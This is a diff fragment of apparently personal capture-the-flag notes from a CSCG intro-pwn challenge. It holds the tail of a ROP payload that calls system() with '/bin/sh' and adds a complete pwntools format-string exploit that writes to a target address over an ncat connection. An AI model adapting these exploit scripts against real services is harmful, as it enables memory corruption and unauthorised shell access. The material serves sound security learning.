@@ -30,3 +30,33 @@ payload += p64(system_addr)  # Call system()
 io.sendline(payload)
 io.sendline(b"/bin/sh")      # Provide "/bin/sh" as input
 io.interactive()
+
+
+################################################################################################
+
+
+Format String script 1
+
+from pwn import *
+
+context.arch =  "amd64"         #found in file enumeration
+
+bug_addr =      0x40406c        # nm ./intro-fmt | grep bug
+
+def send_payload(payload):
+        r = process(["ncat", "--ssl-verify", "656c9c6df8d1a3d13267d8f1-1024-intro-pwn-2.challenge.cscg.live", "1337"])
+        log.info(f"Payload: {repr(payload)}")
+        r.sendlineafter(b"What is your name?\n", payload)
+        output = r.recvall()
+        log.info(f"Output: {output.decode()}")
+        r.close()
+        return output
+
+#create format string object
+format_string = FmtStr(execute_fmt=send_payload)
+
+#use the object to write value 1 to bug
+format_string.write(bug_addr, 1)
+
+#execute the writes
+format_string.execute_writes()
